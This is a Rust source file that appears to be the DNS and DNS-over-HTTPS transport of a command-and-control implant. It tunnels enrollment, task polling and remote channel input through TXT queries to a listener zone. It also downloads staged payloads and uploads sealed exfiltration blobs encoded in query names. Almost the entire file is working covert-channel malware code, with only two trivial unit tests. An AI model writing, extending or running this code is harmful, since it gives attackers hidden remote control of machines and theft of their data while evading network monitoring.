use std::io::Read;
use std::net::UdpSocket;
use std::time::Duration;

use prost::Message;
use rand::Rng;
use sha2::{Digest, Sha256};

use super::Contact;
use crate::envelope;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, TaskRequest, TaskResult};

// The DNS carriage (architecture.md Sec 8, the datagram family): contacts as
// TXT queries under the listener's zone, the query NAME carrying the
// implant's message base32-encoded into labels. No handshake exists on this
// wire -- the enrollment exchange itself opens the session, and every poll
// refreshes it. The grammar (lowercase RFC 4648 base32, no padding, one
// label per field):
//
//   poll        p.<b32(implant id)>.<zone>
//   sealed poll k.<b32(implant id)>.<b32(key id)>.<zone>
//   result      r.<b32(task)>.<s|f>.<seq>.<t|m>.<b32(chunk)>.<b32(implant)>.<zone>
//   channel     c.<b32(task)>.<seq>.<t|m>.<b32(chunk)>.<b32(implant)>.<zone>
//   delivery    n.<b32(task)>.<b32(sha128)>.<b32(implant)>.<zone>
//   enroll      e.<b32(stream)>.<seq>.<t|m>.<b32(chunk)>.<zone>
//   answer      a.<b32(token)>.<seq>.<zone>
//   staged      s.<b32(task)>.<offset>.<b32(prefix sha256) | e>.<b32(implant)>.<zone>
//   staged get  d.<b32(token)>.<seq>.<zone>
//
// A poll's TXT answer concatenates to the base32 of kind || message -- 't'
// for a signed TaskRequest, 'i' for length-prefixed ChannelInput payloads
// (the store-and-forward channel discipline) -- sealed as a raw R1 body
// under the DNS poll tag when the artifact baked a key. Results and channel
// output chunk upstream under their own tags, each re-sent until the
// delivery probe confirms the blob landed. A staged task demands at its
// seam over s., and the answer's token names a d.-probe download whose
// chunks seal per chunk under the staged tag for a keyed artifact --
// byte-offset resume (ADR-010) on the slowest wire too. Short-argument
// tasking only: a TaskRequest past the datagram budget never crosses this
// wire.

/// One upstream chunk's raw bytes: 39 bytes encode to 63 base32 characters,
/// the label ceiling.
const CHUNK_BYTES: usize = 39;

/// The upload arm's per-run cap over this carrier (the server's DNS-arm
/// twin): a run past it needs a stream carriage, so the drive skips it and
/// the cycle guard owns the outcome.
const DNS_STREAM_BYTES: usize = 1024 * 1024;

/// One sealed blob's plaintext budget: a single ExfilChunk frame whose
/// sealed body stays inside the server's per-stream upload cap.
const EXFIL_BLOB_BYTES: usize = 3800;

/// The poll answer's kind bytes: the TXT payload is base32 of
/// kind || message, so a frame names itself without a parse-guess.
const TASK_KIND: u8 = b't';
const INPUT_KIND: u8 = b'i';

/// One UDP exchange's bounds.
const EXCHANGE_TIMEOUT: Duration = Duration::from_secs(5);
const MAX_DATAGRAM: usize = 1232;

pub struct Dns {
    exchange: Exchange,
    zone: String,
    seal: Option<SealedKey>,
    /// Blobs awaiting delivery confirmation: re-sent whole (sequence
    /// 0..terminal, in order) until the probe answers.
    pending: Vec<Pending>,
}

/// The baked key split for the DNS carriage's raw-body sealing.
#[derive(Clone)]
struct SealedKey {
    key_id: [u8; 16],
    key: [u8; 32],
}

enum Exchange {
    Udp { socket: UdpSocket, resolver: String },
    Doh { url: String, agent: ureq::Agent },
}

struct Pending {
    task: String,
    kind: PendingKind,
    chunks: Vec<Vec<u8>>,
    /// The first 16 SHA-256 bytes over the plaintext: the delivery
    /// probe's identity.
    sha: [u8; 16],
}

enum PendingKind {
    Result { succeeded: bool },
    Channel,
}

/// Parses the DNS family's dial (dns:// or doh://resolver[:port]/zone) into
/// its parts; None for any other scheme.
pub fn parse_front(url: &str) -> Option<(&'static str, String, String)> {
    let (scheme, rest) = match url.split_once("://") {
        Some(("dns", rest)) => ("dns", rest),
        Some(("doh", rest)) => ("doh", rest),
        _ => return None,
    };
    let (authority, path) = match rest.find('/') {
        Some(at) => (&rest[..at], &rest[at + 1..]),
        None => (rest, ""),
    };
    if authority.is_empty() {
        return None;
    }
    let zone = path.split('/').next().unwrap_or("").trim_end_matches('.');
    Some((scheme, authority.to_string(), zone.to_string()))
}

/// The DNS family's enroll exchange: the body -- framed EnrollRequest,
/// sealed under the socket exchange's request tag when the bake carries a
/// key -- uploads as e-chunks, and the answer downloads under a token as
/// a-probe chunks. The accepted enrollment opens the session server-side.
pub fn enroll_over_dns(
    url: &str,
    profile: &Profile,
    keys: &crate::enroll::KeyPair,
) -> Result<crate::enroll::Enrollment, String> {
    let (scheme, resolver, zone) =
        parse_front(url).ok_or_else(|| "enroll transport: not a DNS front".to_string())?;
    let exchange =
        build_exchange(scheme, &resolver, profile).map_err(|e| format!("enroll transport: {e}"))?;
    let sealed = sealed_key(profile);

    let request = crate::enroll::wire_enroll_request(profile, keys);
    let frames = crate::wire::encode(&[Frame {
        payload: request.encode_to_vec(),
        kind: FrameKind::EnrollRequest as i32,
    }]);
    let body = match &sealed {
        Some(key) => envelope::seal_contact_body(
            &frames,
            &key.key_id,
            &key.key,
            envelope::SOCKET_ENROLL_REQUEST_AAD,
        ),
        None => frames,
    };

    // Upload: in-order chunks, each answered "+" while chunks remain or
    // "=<b32 token>" on the terminal one. A dropped query re-sends.
    let stream: [u8; 8] = rand::thread_rng().gen();
    let mut token = Vec::new();
    for (index, window) in body.chunks(CHUNK_BYTES).enumerate() {
        let terminal = (index + 1) * CHUNK_BYTES >= body.len();
        let name = format!(
            "e.{}.{}.{}.{}.{}",
            base32_encode(&stream),
            index,
            if terminal { "t" } else { "m" },
            if window.is_empty() {
                "e".into()
            } else {
                base32_encode(window)
            },
            zone,
        );
        // A None answer here is a dropped chunk on the wire -- resend.
        // A persistently empty one (a wrong zone, a listener that never
        // answers) must end the walk, not park it: three misses in a row
        // name the front dead.
        let mut misses = 0;
        let answer = loop {
            match query(&exchange, &name) {
                Ok(Some(text)) => break text,
                Ok(None) => {
                    misses += 1;
                    if misses >= 3 {
                        return Err("enroll transport: the front never answered the upload".into());
                    }
                }
                Err(e) => return Err(format!("enroll transport: {e}")),
            }
        };
        let text = String::from_utf8_lossy(&answer).into_owned();
        if let Some(rest) = text.strip_prefix('=') {
            token = base32_decode(rest).ok_or_else(|| "enroll read: bad token".to_string())?;
            break;
        }
    }
    if token.is_empty() {
        return Err("enroll read: the upload never assembled".to_string());
    }

    // Download: probe each answer chunk until the terminal one; the
    // assembled body is the framed EnrollResponse, sealed under the
    // response tag when the upload was.
    let mut assembled = Vec::new();
    let mut probe_misses = 0;
    for sequence in 0.. {
        let name = format!("a.{}.{}.{}", base32_encode(&token), sequence, zone);
        let answer = query(&exchange, &name).map_err(|e| format!("enroll read: {e}"))?;
        let Some((terminal, chunk)) = answer
            .map(|payload| String::from_utf8_lossy(&payload).into_owned())
            .and_then(|text| parse_answer_chunk(&text))
        else {
            probe_misses += 1;
            if probe_misses >= 3 {
                return Err("enroll read: the answer never appeared under the token".into());
            }
            continue; // the probe raced the store: retry
        };
        probe_misses = 0;
        assembled.extend_from_slice(&chunk);
        if terminal {
            break;
        }
    }
    let plain = match &sealed {
        Some(key) => envelope::try_open_contact_body(
            &assembled,
            &key.key_id,
            &key.key,
            envelope::SOCKET_ENROLL_RESPONSE_AAD,
        )
        .ok_or_else(|| "enroll answer did not verify under the baked key".to_string())?,
        None => assembled,
    };
    let frames = crate::wire::parse(&plain)
        .ok_or_else(|| "enroll answer was not valid framing".to_string())?;
    let answer = frames
        .iter()
        .find(|frame| frame.kind() == FrameKind::EnrollResponse)
        .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
        .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
    crate::enroll::enrollment_from_response(answer)
}

impl Dns {
    pub fn new(dial: &str, profile: &Profile) -> Result<Dns, String> {
        let (scheme, resolver, zone) =
            parse_front(dial).ok_or_else(|| "the DNS dial is not a DNS front".to_string())?;
        let exchange = build_exchange(scheme, &resolver, profile)?;
        Ok(Dns {
            exchange,
            zone,
            seal: sealed_key(profile),
            pending: Vec::new(),
        })
    }

    /// One poll contact: upstream first (unconfirmed blobs re-send whole),
    /// then the poll itself, its answer's tasking accepted and channel
    /// input fed, then the outbox drained into upstream blobs.
    fn contact(&mut self, session: &mut Session) -> Result<(), ContactError> {
        self.flush_pending(session)?;
        let answer = self.poll(session)?;
        if let Some(payload) = answer {
            let (kind, message) = payload.split_first().ok_or(ContactError::Protocol(
                "the poll answer carried no kind byte",
            ))?;
            match *kind {
                TASK_KIND => {
                    if let Ok(task) = TaskRequest::decode(message) {
                        // No acks on this wire: a result is the outcome
                        // record, and the datagram has no dispatch ledger to
                        // answer.
                        session.accept(&task, false);
                    }
                }
                INPUT_KIND => {
                    for payload in split_length_prefixed(message) {
                        if let Ok(input) = ChannelInput::decode(payload) {
                            session.channels.feed(&input.task_id, input.data, input.eof);
                        }
                    }
                }
                _ => {}
            }
        }

        // The session's produce becomes upstream blobs: results and channel
        // output both re-assemble server-side, so the blob takes over the
        // delivery duty the outbox's batch discipline holds elsewhere.
        session.drain_channels();
        // A staged task this poll accepted (or an earlier cycle left
        // pending) services inside the contact: the s./d. exchange is its
        // own query loop, and a transfer it completes queues its result for
        // this cycle's upstream drain below.
        self.drive_staged(session)?;
        // The upload arm's own drive (ADR-010): each pending run probes its
        // seam and carries one sealed blob, x./u. -- before the batch drain
        // so a run the transfer completes lands with this cycle's results.
        self.drive_exfil(session)?;
        let batch = session.outbox.batch();
        for frame in &batch {
            match frame.kind() {
                FrameKind::TaskResult => {
                    if let Ok(result) = TaskResult::decode(frame.payload.as_ref()) {
                        // The staged arm's payload hash rides the grammar this
                        // carriage carries: only the output string crosses as
                        // r-chunks, so the token rides its tail and the server
                        // strips it before recording.
                        let mut report = result.output.clone();
                        if let Some(sha) = result.payload_sha256.as_deref() {
                            report.push_str("\nsha256:");
                            report.push_str(sha);
                        }
                        for blob in split_upstream(report.as_bytes()) {
                            self.enqueue(
                                &result.task_id,
                                PendingKind::Result {
                                    succeeded: result.outcome
                                        == crate::wire::rod::TaskOutcome::Succeeded as i32,
                                },
                                blob,
                            );
                        }
                    }
                }
                FrameKind::ChannelOutput => {
                    if let Ok(output) = crate::wire::ChannelOutput::decode(frame.payload.as_ref()) {
                        for blob in split_upstream(&output.data) {
                            self.enqueue(&output.task_id, PendingKind::Channel, blob);
                        }
                    }
                }
                _ => {}
            }
        }
        session.outbox.batch_crossed(batch.len());
        session.staged_cycle_end();
        session.exfil_cycle_end();
        self.flush_pending(session)
    }

    /// The staged arm over the datagram grammar (ADR-010): each pending
    /// transfer demands at its seam -- s.&lt;task&gt;.&lt;offset&gt;.&lt;prefix
    /// proof&gt;.&lt;implant&gt; -- and the answer's token names a download
    /// the d. probes drain chunk by chunk, each chunk placed at its absolute
    /// offset through the session's shared transfer state. A demand this
    /// carrier does not answer counts against the no-progress guard; a
    /// download that stalls (an evicted token, a dead front) breaks and
    /// re-demands on the next cycle from wherever the placement stopped --
    /// the same resume the stream carriages run, on the query-rate cadence.
    fn drive_staged(&mut self, session: &mut Session) -> Result<(), ContactError> {
        for task_id in session.staged_pending() {
            let (offset, prefix) = session.staged_seam(&task_id);
            let proof = match &prefix {
                Some(sha) => base32_encode(sha),
                None => "e".into(),
            };
            let name = format!(
                "s.{}.{}.{}.{}.{}",
                base32_encode(task_id.as_bytes()),
                offset,
                proof,
                base32_encode(session.implant_id.as_bytes()),
                self.zone,
            );
            let Ok(Some(answer)) = query(&self.exchange, &name) else {
                continue; // unanswered: the cycle's idle guard owns the failure
            };
            let text = String::from_utf8_lossy(&answer).into_owned();
            let Some(token) = text.strip_prefix('=').and_then(base32_decode) else {
                continue;
            };

            // The download: sequential probes to the terminal chunk, placing
            // each at its offset -- a gap the placement refuses leaves the
            // state intact, and the next demand re-establishes the seam.
            let mut at = offset;
            let mut misses = 0;
            for sequence in 0u64.. {
                let name = format!("d.{}.{}.{}", base32_encode(&token), sequence, self.zone);
                let Ok(answer) = query(&self.exchange, &name) else {
                    break; // a transport failure ends the burst for this cycle
                };
                let Some((terminal, sealed)) = answer
                    .map(|payload| String::from_utf8_lossy(&payload).into_owned())
                    .and_then(|text| parse_answer_chunk(&text))
                else {
                    misses += 1;
                    if misses >= 3 {
                        break; // the token is gone: re-demand next cycle
                    }
                    continue;
                };
                misses = 0;
                let plain = match &self.seal {
                    Some(key) => match envelope::try_open_raw_body(
                        &sealed,
                        &key.key_id,
                        &key.key,
                        envelope::DNS_STAGED_AAD,
                    ) {
                        Some(opened) => opened,
                        None => {
                            misses += 1;
                            if misses >= 3 {
                                break;
                            }
                            continue;
                        }
                    },
                    None => sealed,
                };
                let chunk = StagedChunk {
                    task_id: task_id.clone(),
                    sequence,
                    terminal,
                    data: plain,
                    offset: Some(at),
                };
                at += chunk.data.len() as u64;
                let done = chunk.terminal;
                session.accept_staged_chunk(&chunk);
                if done {
                    break;
                }
            }
        }
        Ok(())
    }

    /// The upload arm over the datagram grammar (ADR-010): each pending run
    /// probes its seam -- x.&lt;task&gt;.&lt;name's sha128&gt;.&lt;implant&gt;,
    /// answered with the decimal held count -- then carries one sealed blob
    /// from the reported seam as a u. upload stream (e.-shaped: in-order
    /// chunks, a fresh client-chosen stream id per blob). One blob per run
    /// per cycle, the query-rate cadence; a lost blob never moves the seam,
    /// so the next probe re-serves it -- placement is idempotent
    /// server-side. Sealed-only by the arm's own decision: a bake without a
    /// key carries no exfil over DNS (the cycle guard retires the run), and
    /// a run past the DNS arm's cap waits for a stream carriage.
    fn drive_exfil(&mut self, session: &mut Session) -> Result<(), ContactError> {
        let Some(seal) = self.seal.clone() else {
            return Ok(());
        };
        for stream in session.exfil_streams() {
            if stream.total > DNS_STREAM_BYTES {
                continue;
            }
            let mut name_sha = [0u8; 16];
            name_sha.copy_from_slice(&Sha256::digest(stream.name.as_bytes())[..16]);
            let probe = format!(
                "x.{}.{}.{}.{}",
                base32_encode(stream.task.as_bytes()),
                base32_encode(&name_sha),
                base32_encode(session.implant_id.as_bytes()),
                self.zone,
            );
            let Ok(Some(answer)) = query(&self.exchange, &probe) else {
                continue; // unanswered: the cycle's no-progress guard owns it
            };
            let text = String::from_utf8_lossy(&answer).into_owned();
            let Ok(held) = text.trim().parse::<u64>() else {
                continue;
            };
            session.exfil_progress(&stream.task, &stream.name, held);
            let Some(blob) = session.exfil_blob(&stream.task, &stream.name, EXFIL_BLOB_BYTES)
            else {
                continue; // the report retired the run: it landed
            };
            let sealed =
                envelope::seal_raw_body(&blob, &seal.key_id, &seal.key, envelope::DNS_EXFIL_AAD);
            let stream_id: [u8; 8] = rand::thread_rng().gen();
            for (index, window) in sealed.chunks(CHUNK_BYTES).enumerate() {
                let terminal = (index + 1) * CHUNK_BYTES >= sealed.len();
                let name = format!(
                    "u.{}.{}.{}.{}.{}.{}",
                    base32_encode(&stream_id),
                    index,
                    if terminal { "t" } else { "m" },
                    if window.is_empty() {
                        "e".into()
                    } else {
                        base32_encode(window)
                    },
                    base32_encode(session.implant_id.as_bytes()),
                    self.zone,
                );
                // An answer or its absence means nothing on the upload path
                // -- the next cycle's seam probe is the arbiter -- so a
                // failed query ends the blob for this cycle, not the run.
                if query(&self.exchange, &name).is_err() {
                    break;
                }
            }
        }
        Ok(())
    }

    fn enqueue(&mut self, task: &str, kind: PendingKind, plaintext: Vec<u8>) {
        let mut sha = [0u8; 16];
        sha.copy_from_slice(&Sha256::digest(&plaintext)[..16]);
        let wrapped = match (&self.seal, &kind) {
            (Some(key), PendingKind::Result { .. }) => {
                envelope::seal_raw_body(&plaintext, &key.key_id, &key.key, envelope::DNS_RESULT_AAD)
            }
            (Some(key), PendingKind::Channel) => envelope::seal_raw_body(
                &plaintext,
                &key.key_id,
                &key.key,
                envelope::DNS_CHANNEL_AAD,
            ),
            _ => plaintext,
        };
        self.pending.push(Pending {
            task: task.to_string(),
            kind,
            chunks: wrapped.chunks(CHUNK_BYTES).map(<[u8]>::to_vec).collect(),
            sha,
        });
    }

    /// Sends every unconfirmed blob: a delivery probe first (a confirmed
    /// blob drops), then the whole chunk run in sequence order -- the
    /// server's reassembler takes any order, and the re-send is idempotent
    /// under first-wins.
    fn flush_pending(&mut self, session: &Session) -> Result<(), ContactError> {
        let pending = std::mem::take(&mut self.pending);
        let mut retained = Vec::new();
        for blob in pending {
            let exchange = &self.exchange;
            let confirmed =
                probe(exchange, session, &self.zone, &blob.task, &blob.sha).unwrap_or(false);
            if confirmed {
                continue;
            }
            let terminal = blob.chunks.len().saturating_sub(1);
            for (index, chunk) in blob.chunks.iter().enumerate() {
                let name = match &blob.kind {
                    PendingKind::Result { succeeded } => format!(
                        "r.{}.{}.{}.{}.{}.{}.{}",
                        base32_encode(blob.task.as_bytes()),
                        if *succeeded { "s" } else { "f" },
                        index,
                        if index == terminal { "t" } else { "m" },
                        if chunk.is_empty() {
                            "e".into()
                        } else {
                            base32_encode(chunk)
                        },
                        base32_encode(session.implant_id.as_bytes()),
                        self.zone,
                    ),
                    PendingKind::Channel => format!(
                        "c.{}.{}.{}.{}.{}.{}",
                        base32_encode(blob.task.as_bytes()),
                        index,
                        if index == terminal { "t" } else { "m" },
                        if chunk.is_empty() {
                            "e".into()
                        } else {
                            base32_encode(chunk)
                        },
                        base32_encode(session.implant_id.as_bytes()),
                        self.zone,
                    ),
                };
                // An answer or its absence means nothing on the chunk paths
                // -- the delivery probe is the only confirmation -- so a
                // failed query is a re-send on the next contact, not an
                // error that drops the cycle.
                let _ = query(exchange, &name);
            }
            retained.push(blob);
        }
        self.pending = retained;
        Ok(())
    }

    /// One poll: the key-named shape when the bake carries a key (its
    /// answer sealed under the DNS poll tag), the plaintext shape otherwise.
    fn poll(&self, session: &Session) -> Result<Option<Vec<u8>>, ContactError> {
        let name = match &self.seal {
            Some(key) => format!(
                "k.{}.{}.{}",
                base32_encode(session.implant_id.as_bytes()),
                base32_encode(&key.key_id),
                self.zone,
            ),
            None => format!(
                "p.{}.{}",
                base32_encode(session.implant_id.as_bytes()),
                self.zone,
            ),
        };
        match query(&self.exchange, &name)? {
            Some(packed) => {
                let payload = match &self.seal {
                    Some(key) => envelope::try_open_raw_body(
                        &packed,
                        &key.key_id,
                        &key.key,
                        envelope::DNS_POLL_AAD,
                    )
                    .ok_or(ContactError::Protocol(
                        "the poll answer did not verify under the baked key",
                    ))?,
                    None => packed,
                };
                Ok(Some(payload))
            }
            None => Ok(None),
        }
    }
}

impl Contact for Dns {
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        match self.contact(session) {
            Ok(()) => Ok(Attempt::Crossed),
            // A datagram carrier has no refused handshake: every failure is
            // a dropped cycle the cadence retries.
            Err(e) => Err(e),
        }
    }
}

/// One delivery probe: TXT "y" when the exact blob landed.
fn probe(
    exchange: &Exchange,
    session: &Session,
    zone: &str,
    task: &str,
    sha: &[u8; 16],
) -> Option<bool> {
    let name = format!(
        "n.{}.{}.{}.{}",
        base32_encode(task.as_bytes()),
        base32_encode(sha),
        base32_encode(session.implant_id.as_bytes()),
        zone,
    );
    match query(exchange, &name).ok()? {
        Some(payload) => Some(payload == b"y"),
        None => Some(false),
    }
}

fn sealed_key(profile: &Profile) -> Option<SealedKey> {
    if profile.contact_envelope != "aesgcm" {
        return None;
    }
    envelope::parse_baked_key(&profile.envelope_key).map(|(key_id, key)| SealedKey { key_id, key })
}

/// Splits an upstream payload into reassembly-sized pieces: the server's
/// bounded buffer caps a whole blob, so a long output or a chatty channel
/// streams as consecutive blobs (each reassembling into its own record).
fn split_upstream(data: &[u8]) -> Vec<Vec<u8>> {
    const BLOB_BYTES: usize = 3800;
    if data.is_empty() {
        return vec![Vec::new()];
    }
    data.chunks(BLOB_BYTES).map(<[u8]>::to_vec).collect()
}

/// Splits the input answer's length-prefixed ChannelInput payloads.
fn split_length_prefixed(message: &[u8]) -> Vec<&[u8]> {
    let mut payloads = Vec::new();
    let mut offset = 0;
    while offset < message.len() {
        let mut length = 0usize;
        let mut shift = 0;
        while offset < message.len() {
            let byte = message[offset];
            offset += 1;
            length |= ((byte & 0x7f) as usize) << shift;
            if byte & 0x80 == 0 {
                break;
            }
            shift += 7;
        }
        if offset + length > message.len() {
            break;
        }
        payloads.push(&message[offset..offset + length]);
        offset += length;
    }
    payloads
}

fn parse_answer_chunk(text: &str) -> Option<(bool, Vec<u8>)> {
    let (flag, rest) = text.split_once('.')?;
    let terminal = match flag {
        "t" => true,
        "m" => false,
        _ => return None,
    };
    Some((terminal, base32_decode(rest)?))
}

fn build_exchange(scheme: &str, resolver: &str, profile: &Profile) -> Result<Exchange, String> {
    match scheme {
        "doh" => {
            let url = format!("https://{resolver}/dns-query");
            let agent =
                crate::transport::build_agent(&url, profile, profile.request_timeout_seconds);
            Ok(Exchange::Doh { url, agent })
        }
        _ => {
            let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
            socket
                .set_read_timeout(Some(EXCHANGE_TIMEOUT))
                .map_err(|e| e.to_string())?;
            Ok(Exchange::Udp {
                socket,
                resolver: resolver.to_string(),
            })
        }
    }
}

/// One TXT query: None when the answer carries no record (the server's
/// nothing-to-send shape); Some for the answer's decoded payload -- every
/// TXT answer this grammar carries is base32-wrapped, the payload text and
/// the framing alike, so the decode happens once here.
fn query(exchange: &Exchange, name: &str) -> Result<Option<Vec<u8>>, ContactError> {
    let wire = build_query(name);
    let datagram = match exchange {
        Exchange::Udp { socket, resolver } => {
            socket
                .send_to(&wire, resolver)
                .map_err(|e| ContactError::Transport(e.to_string()))?;
            let mut buffer = [0u8; 4096];
            let (read, _) = socket
                .recv_from(&mut buffer)
                .map_err(|e| ContactError::Transport(e.to_string()))?;
            buffer[..read].to_vec()
        }
        Exchange::Doh { url, agent } => {
            let response = agent
                .post(url)
                .set("Content-Type", "application/dns-message")
                .send_bytes(&wire)
                .map_err(|e| ContactError::Transport(e.to_string()))?;
            if response.status() != 200 {
                return Err(ContactError::Transport(format!(
                    "doh status {}",
                    response.status()
                )));
            }
            let mut datagram = Vec::new();
            response
                .into_reader()
                .take(64 << 10)
                .read_to_end(&mut datagram)
                .map_err(|e| ContactError::Transport(e.to_string()))?;
            datagram
        }
    };
    match parse_txt(&datagram).map_err(|e| ContactError::Transport(e.to_string()))? {
        Some(text) => base32_decode(&text)
            .map(Some)
            .ok_or(ContactError::Protocol("the TXT answer was not base32")),
        None => Ok(None),
    }
}

/// Builds one TXT query with the EDNS0 record the 1232-byte budget rides on.
fn build_query(name: &str) -> Vec<u8> {
    let id: u16 = rand::thread_rng().gen();
    let mut wire = Vec::with_capacity(128);
    wire.extend_from_slice(&id.to_be_bytes());
    wire.extend_from_slice(&[0x01, 0x00]); // flags: recursion desired
    wire.extend_from_slice(&[0, 1, 0, 0, 0, 0, 0, 1]); // counts: one question, one additional
    for label in name.split('.') {
        wire.push(label.len() as u8);
        wire.extend_from_slice(label.as_bytes());
    }
    wire.push(0);
    wire.extend_from_slice(&16u16.to_be_bytes()); // TXT
    wire.extend_from_slice(&1u16.to_be_bytes()); // IN
                                                 // The OPT record: root name, type 41, class = 1232 payload size.
    wire.push(0);
    wire.extend_from_slice(&41u16.to_be_bytes());
    wire.extend_from_slice(&1232u16.to_be_bytes());
    wire.extend_from_slice(&[0; 6]);
    wire
}

/// Parses the first TXT answer's concatenated strings; None when the
/// response carries none. Pointer-aware name skips (the server may
/// compress), single answer read -- the contact grammar answers one record
/// or nothing.
fn parse_txt(datagram: &[u8]) -> Result<Option<String>, std::io::Error> {
    use std::io::{Error, ErrorKind};
    if datagram.len() < 12 || datagram.len() > MAX_DATAGRAM + 512 {
        return Err(Error::new(ErrorKind::InvalidData, "malformed dns header"));
    }
    let answers = u16::from_be_bytes([datagram[6], datagram[7]]);
    if answers == 0 {
        return Ok(None);
    }
    let mut offset = 12;
    skip_name(datagram, &mut offset)?;
    offset += 4; // question type and class
    skip_name(datagram, &mut offset)?;
    offset += 8; // answer type, class, ttl
    if offset + 2 > datagram.len() {
        return Err(Error::new(ErrorKind::InvalidData, "truncated answer"));
    }
    let rdlength = u16::from_be_bytes([datagram[offset], datagram[offset + 1]]) as usize;
    offset += 2;
    let end = (offset + rdlength).min(datagram.len());
    let mut text = String::new();
    while offset < end {
        let length = datagram[offset] as usize;
        offset += 1;
        if offset + length > end {
            return Err(Error::new(ErrorKind::InvalidData, "truncated txt string"));
        }
        text.push_str(&String::from_utf8_lossy(&datagram[offset..offset + length]));
        offset += length;
    }
    Ok(Some(text))
}

fn skip_name(datagram: &[u8], offset: &mut usize) -> Result<(), std::io::Error> {
    use std::io::{Error, ErrorKind};
    while *offset < datagram.len() {
        let length = datagram[*offset];
        if length == 0 {
            *offset += 1;
            return Ok(());
        }
        if length & 0xC0 == 0xC0 {
            *offset += 2;
            return Ok(());
        }
        *offset += 1 + length as usize;
    }
    Err(Error::new(ErrorKind::InvalidData, "unterminated name"))
}

// Lowercase RFC 4648 base32 without padding.

fn base32_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";
    let mut text = String::with_capacity(bytes.len().div_ceil(5));
    let mut bits = 0u16;
    let mut count = 0u8;
    for byte in bytes {
        bits = (bits << 8) | *byte as u16;
        count += 8;
        while count >= 5 {
            count -= 5;
            text.push(ALPHABET[((bits >> count) & 0x1F) as usize] as char);
        }
    }
    if count > 0 {
        text.push(ALPHABET[((bits << (5 - count)) & 0x1F) as usize] as char);
    }
    text
}

fn base32_decode(text: &str) -> Option<Vec<u8>> {
    let mut bits = 0u16;
    let mut count = 0u8;
    let mut bytes = Vec::with_capacity(text.len() * 5 / 8);
    for c in text.trim_end_matches('=').chars() {
        let value = match c {
            'a'..='z' => c as u16 - 'a' as u16,
            'A'..='Z' => c as u16 - 'A' as u16,
            '2'..='7' => c as u16 - '2' as u16 + 26,
            _ => return None,
        };
        bits = (bits << 5) | value;
        count += 5;
        if count >= 8 {
            count -= 8;
            bytes.push((bits >> count) as u8);
        }
    }
    Some(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base32_round_trips_the_guid_shape() {
        let id = "01234567-89ab-cdef-0123-456789abcdef";
        let encoded = base32_encode(id.as_bytes());
        assert!(encoded.len() <= 63, "one label: {}", encoded.len());
        assert_eq!(base32_decode(&encoded).unwrap(), id.as_bytes());
    }

    #[test]
    fn length_prefixed_inputs_split() {
        let mut message = vec![3u8];
        message.extend_from_slice(b"abc");
        message.push(0);
        let parts = split_length_prefixed(&message);
        assert_eq!(parts, vec![&b"abc"[..], &b""[..]]);
    }
}
